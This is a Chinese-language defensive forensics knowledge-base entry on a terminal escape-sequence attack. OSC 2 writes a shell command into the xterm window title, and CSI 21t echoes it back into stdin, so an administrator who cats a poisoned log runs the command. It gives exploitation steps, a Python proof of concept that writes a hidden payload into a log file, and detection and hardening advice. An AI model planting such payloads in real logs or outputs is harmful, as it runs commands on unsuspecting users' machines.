---
id: defense-forensics-terminal-title-query-stdin-rce
title: 窗口标题查询序列 ESC[21t 把注入内容回灌 stdin 导致终端命令执行
type: scenario
domain: defense
path: defense/forensics
technique: terminal-title-query-stdin-injection
tags:
- forensics
- terminal
- ansi-escape
- rce
- xterm
- stdin-injection
- log-poisoning
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-04'
updated: '2026-11-05'
verification:
  verified_by: verifier-V9
  verified_at: '2026-11-05T00:36:14+08:00'
  notes: '已对照原文与图12/15/16/17核对：payload 字节结构 1b[8m + 1b]2; + 命令 + 07 + 1b[21t + 1b[0m 与 hexdump 一致；在 xterm allowWindowOps:true 沙箱中 cat 投毒日志后，提示符出现 l; id > /tmp/title_rce_proof ; #，图17 证明文件生成。依赖终端配置与 Shell 行为，confidence=medium 合理；DECRQSS 未复现成功仅在变体注明。PoC 未在本机执行。'
url: /docs/defense/forensics/defense-forensics-terminal-title-query-stdin-rce/
draft: false
kb_aliases:
- 窗口标题 RCE
- CSI 21t 注入
- 标题回显执行命令
- 终端 stdout 污染 stdin
- xterm allowWindowOps RCE
---

## 一句话结论

攻击者先用 OSC 2 把 Shell 命令写进终端窗口标题，再用 CSI 21t 请求终端把标题回传；支持该操作且开启窗口操作的终端会把标题内容灌入当前输入流，Shell 按 `;`、`#` 切分后执行命令——管理员 `cat` 一条投毒日志即可在终端里触发命令执行。

## 原理

- `ESC ] 2 ; <text> BEL` 设置窗口标题；`ESC [ 21 t` 是“报告窗口标题”的 CSI 查询。
- 部分终端（如允许 window ops 的 xterm）会把标题内容作为对查询的响应写回 PTY，而 PTY 的响应进入进程的 stdin，等价于向 Shell 键盘输入了一串字符。
- 输入流与输出流在终端处汇合：程序写到 stdout 的字节可以变成 Shell 的输入，这与 Web 的“存储型/反射型 XSS”同构，只是渲染器换成了终端。
- 之所以能执行：Shell 把回传文本当作命令行；payload 用前导 `;` 吸收终端追加的杂质（如 `^[]l`），用结尾 `; #` 把尾部杂质注释掉，中间的 `id > /tmp/proof` 因此成为合法命令。
- `\e[8m` 可把整段 payload 设为隐藏色，管理员在日志里看不到注入内容。

## 触发条件

- 目标终端支持并允许窗口操作/标题查询（xterm 需 `allowWindowOps: true` 或未被 `disallowedWindowOps` 禁用；部分终端默认关闭）；
- 攻击者能向受害者将要查看的文件/输出写入原始字节（日志、文件内容、`curl` 响应）；
- 受害者用 `cat` 等命令在脆弱终端中查看，且 Shell 会接受回传内容作为命令（取决于终端回传格式与 Shell/readline 行为）；
- 受害者终端处于交互式 Shell 会话。

## 利用步骤

1. 构造隐藏 payload：`\e[8m` + `\e]2;; <cmd> ; #` + `\a` + `\e[21t` + `\e[0m`。
2. 写入日志文件或让受害者访问的接口返回该字节流。
3. 受害者在支持窗口操作查询的终端里 `cat` 该文件；终端设置标题并把标题回灌 stdin。
4. 检查命令副作用（如写入的证明文件）确认执行；`\e[0m` 恢复正常显示，后续日志照常打印，降低察觉概率。

## PoC

```python
payload = (
    b"\x1b[8m"                    # 隐藏后续文本
    b"\x1b]2;; id > /tmp/title_rce_proof ; #\x07"  # 设置标题
    b"\x1b[21t"                   # 查询标题 -> 回灌 stdin
    b"\x1b[0m"
)
open("/tmp/poisoned.log", "wb").write(b"[INFO] Service started\n" + payload + b"\n[INFO] TLS ok\n")
```

在允许窗口操作的 xterm 中验证：

```bash
xterm -xrm 'XTerm*allowWindowOps: true' &
cat /tmp/poisoned.log
cat /tmp/title_rce_proof     # 出现 id 输出即成功
```

原始字节特征：`1b 5d 32 3b ... 07 1b 5b 32 31 74`（OSC 2 设置标题后紧跟 `ESC[21t`）。

## 变体与关联

- 变体：同类“终端把响应写回 stdin”的通道还包括字体/状态查询（DECRQSS）、设备属性查询；已有先例 CVE-2022-45063（xterm OSC 50 响应含 BEL，Zsh vi-mode 下触发 `list-expand` 执行命令替换）。
- 关联：[[defense-forensics-ansi-escape-log-poisoning]]（同一注入面的显示欺骗）；[[defense-forensics-carriage-return-output-overwrite]]（无需 ESC 的同行覆盖）。
- 影响边界：依赖终端配置与 Shell 行为，不是所有终端/默认配置都能触发；文章在 xterm 409 显式开启 `allowWindowOps` 的沙箱中验证，其他环境需实测，因此 confidence 定为 medium。
- 注意：DECRQSS 回显注入在原文中未复现成功，仅作为已知先例引用。

## 检测与防御

- 检测：日志/文件出现 `ESC]2;`、`ESC[21t`、`ESC[8m` 组合；终端窗口标题突然变为命令文本；Shell 历史或审计中出现来源不明的 `id`/重定向命令；进程树出现由交互式 Shell 发起的异常子进程。
- 防御：终端禁用窗口操作（xterm `allowWindowOps: false`、`disallowedWindowOps: 20,21,SetXprop`）；查看不可信内容用 `cat -v`、`less -U`、`hexdump -C`；清洗输入中的 ESC/CSI/OSC/DCS 序列；tmux 关闭 `allow-passthrough`；高风险环境使用不实现标题回传的终端，或在隔离会话中查看证据。
